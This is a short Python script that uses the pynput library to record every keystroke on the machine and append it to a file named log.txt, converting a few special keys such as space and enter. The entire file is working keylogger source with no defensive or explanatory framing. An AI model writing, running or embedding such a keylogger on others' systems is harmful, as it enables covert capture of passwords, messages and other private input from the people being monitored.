#with keyword is used to release memory/resources automatically
from pynput.keyboard import Listener

def write_to_file(Key):
    letter=str(Key)
    letter= letter.replace("'","")

    if letter == "Key.space":
        letter=" "
    if letter == "Key.shift_r":
        letter=""
    if letter == "Key.ctrl_l":
        letter=""
    if letter == "Key.shift":
        letter=""
    if letter == "Key.backspace":
        letter=""
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.right":
        letter=""
    if letter == "Key.caps_lock":
        letter=""

    with open("log.txt",'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()